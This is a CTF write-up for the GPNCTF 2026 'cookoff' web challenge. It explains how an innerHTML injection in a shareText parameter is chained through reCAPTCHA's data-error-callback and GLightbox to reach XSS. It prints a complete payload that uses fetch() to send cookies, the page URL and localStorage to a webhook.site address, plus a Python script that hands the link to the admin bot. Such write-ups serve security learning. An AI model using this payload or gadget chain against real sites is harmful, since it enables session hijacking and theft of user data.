---
title: "GPNCTF2026-cookoff"
description: "CTF writeup - cookoff (GPNCTF 2026)"
date: 2026-05-30
tags: [CTF, Web, GPNCTF]
category: "GPNCTF 2026"
cover: ./cover.png
pinned: false
draft: false
---

![](./image.png)

### Analysis

The user enters a message and shares a link. The URL has the form:

```text
/?shareText=<message>
```

When this URL is reopened, the content in `shareText` is inserted into the DOM via `innerHTML`. So we can inject HTML into the page.

The page contains two libraries:

```text
Google reCAPTCHA
GLightbox
```

We can chain these two to trigger XSS.

### Exploitation idea

Google reCAPTCHA supports the attribute:

```html
data-error-callback
```

When the sitekey is invalid, reCAPTCHA calls the function declared in `data-error-callback`.


Exploitation chain:

```text
shareText injection
- add an input class=glightbox
- put the XSS in data-description
- add a reCAPTCHA with an invalid sitekey
- reCAPTCHA calls data-error-callback="GLightbox"
- GLightbox renders data-description
- the XSS runs
```

---

### XSS Payload

Payload used to leak the cookie to a webhook:

```html
<input name=vote class=glightbox data-description="<img src=x onerror=fetch(`https://webhook.site/8eafb00c-ff64-4eaa-a987-16bbabf9b1f3?c=${encodeURIComponent(document.cookie)}&u=${encodeURIComponent(location.href)}&ls=${encodeURIComponent(JSON.stringify(localStorage))}`)>">
<div class=g-recaptcha data-sitekey=x data-error-callback=GLightbox></div>
<div class=g-recaptcha data-sitekey=x data-error-callback=random></div>
<div class=g-recaptcha data-sitekey=x data-error-callback=random></div>
<div class=g-recaptcha data-sitekey=x data-error-callback=random></div>
<div class=g-recaptcha data-sitekey=x data-error-callback=random></div>
```

Here:

```text
data-sitekey=x
```

makes reCAPTCHA fail.

The important callback is:

```text
data-error-callback=GLightbox
```

It calls `GLightbox()` again so the library picks up the `.glightbox` element that was just injected.

The webhook receives:

![](./image-1.png)

So the payload runs successfully.

### Sending the payload to the bot

```text
/bot
```

![](./image-2.png)

The bot only accepts URLs starting with:

```text
http://localhost:1337
```

So we cannot send a public link like:

```text
https://braised-mozzarella-sticks-nestled-in-torched-soy-foam-03k8.gpn24.ctf.kitctf.de/?shareText=...
```

It must instead be changed to:

```text
http://localhost:1337/?shareText=...
```

### Exploit in Python

```python
#!/usr/bin/env python3
import requests
import urllib.parse

BASE = "https://braised-mozzarella-sticks-nestled-in-torched-soy-foam-03k8.gpn24.ctf.kitctf.de"

payload = '''<input name=vote class=glightbox data-description="<img src=x onerror=fetch(`https://webhook.site/8eafb00c-ff64-4eaa-a987-16bbabf9b1f3?c=${encodeURIComponent(document.cookie)}`)>">
<div class=g-recaptcha data-sitekey=x data-error-callback=GLightbox></div>
<div class=g-recaptcha data-sitekey=x data-error-callback=random></div>
<div class=g-recaptcha data-sitekey=x data-error-callback=random></div>
<div class=g-recaptcha data-sitekey=x data-error-callback=random></div>
<div class=g-recaptcha data-sitekey=x data-error-callback=random></div>'''

target = "http://localhost:1337/?shareText=" + urllib.parse.quote_plus(payload)

r = requests.get(
    BASE + "/bot/run",
    params={"url": target},
    timeout=30
)

print(r.status_code)
print(r.text)
print(target)
```

Check the webhook:

![](./image-3.png)

### Flag

```text
GPNCTF{why_can_recAP7CHa_Do_thAt}
```
